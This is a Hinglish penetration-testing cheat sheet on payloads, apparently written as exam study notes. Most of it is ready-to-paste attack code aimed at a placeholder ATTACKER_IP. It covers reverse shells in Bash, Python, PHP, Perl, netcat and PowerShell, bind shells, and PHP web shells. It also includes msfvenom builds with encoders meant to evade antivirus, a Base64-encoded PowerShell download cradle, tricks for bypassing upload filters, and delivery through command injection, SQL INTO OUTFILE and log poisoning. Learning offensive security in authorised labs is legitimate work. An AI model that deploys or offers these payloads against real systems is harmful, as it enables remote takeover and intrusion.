01

Payload Concepts

Foundation
TermExplanation
PayloadActual "attack code" jo target pe execute hota hai aur access deta hai
Reverse ShellTarget attacker ki taraf connection banata hai (attacker listener pe wait karta hai)
Bind ShellTarget khud ek port pe listen karta hai, attacker us port se connect karta hai
ListenerAttacker machine pe chalne wala process jo incoming connection ka wait karta hai
LHOST/LPORTAttacker (listener) ka IP aur port — payload ko ye batana zaroori hai kaha connect karna hai
Reverse shell zyada common hai kyunki firewalls usually outbound connections ko easily block nahi karte (jitna inbound karte hain) — isliye target se attacker ki taraf connection banana easier hota hai.
02

Reverse Shells

Most Common

Sabse pehle listener start karo:

nc -lvnp 4444
LanguagePayload
Bash
bash -i >&/dev/tcp/ATTACKER_IP/4444 0>&1
Python3
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER_IP",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("bash")'
PHP
php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
Perl
perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
Netcat (if -e supported)
nc -e /bin/sh ATTACKER_IP 4444
PowerShell (Windows)
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r+'PS> ');$s.Write($sb,0,$sb.Length);$s.Flush()}"
Tip: revshells.com jaisa cheat sheet website bhi bookmark kar — target IP/port daalke instantly copy-paste ready payload mil jaata hai, par tujhe manually samajhna aur likhna bhi aana chahiye (exam mein internet-generated payload copy karna helpful hai, par samajh zaroor honi chahiye).
03

Bind Shells

Less Common

Target khud listen karta hai, tu connect karta hai:

# Target pe (agar command exec mil chuka hai):
nc -lvnp 4444 -e /bin/sh

# Attacker se connect:
nc TARGET_IP 4444
Bind shell tab use hoti hai jab target ka outbound traffic firewall se blocked ho, par inbound specific port allowed ho — kam common hai kyunki zyada firewalls outbound allow karte hain.
04

Web Shells

File Upload Vuln

File upload vulnerability milne pe use hota hai — server-side script upload karke browser se commands chalate hain.

TypeCode
PHP (simple)
<?php system($_GET['cmd']); ?>
Use: http://target/shell.php?cmd=whoami
PHP (POST-based, stealthier)
<?php system($_POST['cmd']); ?>
ASPX (Windows/IIS)msfvenom se generate karo: msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f aspx -o shell.aspx
JSP (Java servers)msfvenom se generate karo: msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f raw -o shell.jsp
Upload restrictions bypass karne ke tarike: extension trick (shell.php.jpg), content-type header spoof, magic bytes add karna (GIF89a; prefix) — depend karta hai server kaise validate kar raha hai.

Staged vs Stageless Payloads

Concept
TypeKaise kaam karta haiPros/Cons
StagedChota "stager" pehle jaata hai, jo connect hote hi bada payload download karta haiChota initial size, par extra network call chahiye (kabhi AV/network monitoring pakad leta hai)
StagelessPoora payload ek hi baar mein jaata hai, koi second download nahiBada size, par single-shot delivery — zyada reliable jab network monitored ho

msfvenom naming convention: windows/meterpreter/reverse_tcp = staged, windows/meterpreter_reverse_tcp (underscore) = stageless.

08

Encoding / Basic Obfuscation

Evasion-lite

Encoding se payload ka signature thoda change hota hai — full AV bypass guarantee nahi, par basic detection kabhi evade ho jaata hai.

# msfvenom encoder use karna
msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o shell_encoded.exe

# Base64 encode karna (PowerShell ke liye)
echo -n "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/s.ps1')" | iconv -t UTF-16LE | base64 -w 0
Modern AV/EDR signature + behavior dono check karte hain — sirf encoding kaafi nahi hoti advanced evasion ke liye (jo Red Team roadmap ke Phase 5 mein deep cover hoga).
09

Shell Upgrade (Full Interactive TTY)

Post-Shell

Basic reverse shell milne ke baad, usse proper terminal jaisa banate hain (tab-complete, ctrl+c handling, clear screen sab kaam kare):

# Step 1: Python se pty spawn karo
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Step 2: Background karo aur terminal settings match karo
# Ctrl+Z dabao, phir attacker terminal mein:
stty raw -echo; fg
# Enter do 2 baar, phir:
export TERM=xterm

File Transfer Payloads (Tool Upload karne ke liye)

Support Task

Foothold milne ke baad, LinPEAS/WinPEAS ya exploit binary target pe transfer karna hota hai:

DirectionMethod
Attacker → Linux target
python3 -m http.server 8000
# target pe:
wget http://ATTACKER_IP:8000/linpeas.sh
curl http://ATTACKER_IP:8000/linpeas.sh -o linpeas.sh
Attacker → Windows target
certutil -urlcache -split -f http://ATTACKER_IP:8000/shell.exe shell.exe
# ya PowerShell:
IWR -Uri http://ATTACKER_IP:8000/shell.exe -OutFile shell.exe
SCP (agar SSH access hai)
scp file.sh user@TARGET_IP:/tmp/

Payload Delivery — Kaise Daalte Hain (Context-wise)

Delivery Methods

Payload ka type aur delivery method hamesha us vulnerability pe depend karta hai jo mili hai — alag-alag situations mein alag method use hota hai:

Vulnerability TypePayload TypeDelivery Method
Command InjectionReverse Shell one-liner (Bash/Python)Seedha vulnerable field mein inject karo — jaise IP field mein 127.0.0.1; bash -i >&/dev/tcp/IP/4444 0>&1
File Upload VulnWeb Shell (PHP/ASPX/JSP)Malicious file upload karo, phir URL se access karo — http://target/uploads/shell.php?cmd=whoami
LFI + Log PoisoningPHP code in logsUser-Agent mein PHP inject karo, phir log file ko LFI ke through include karo — code execute ho jaata hai
SQLi (write privilege)Web Shell via SQLSELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'
Service exploit (CVE)msfvenom EXE/ELF binaryExploit ke saath shellcode embed hota hai — exploit run karte waqt payload automatically execute ho jaata hai
Weak SSH credsKoi payload nahi chahiyeSeedha ssh user@target — pehle se access mil jaata hai, bas privesc karna hoga
WinRM/SMB with credsDirect shell toolsevil-winrm ya psexec.py — binary upload ki zaroorat nahi, built-in execution
AlwaysInstallElevatedMSI payload (msfvenom)MSI file generate karke target pe transfer karo, msiexec /quiet /i payload.msi se run karo
Simple rule: Jo vulnerability mili, pehle dekho us vulnerability ke through kya execute ho sakta hai (OS command? File write? Code execution?) — phir usi execution method ke hisaab se payload choose karo. Payload select pehle mat karo, vulnerability identify pehle karo.
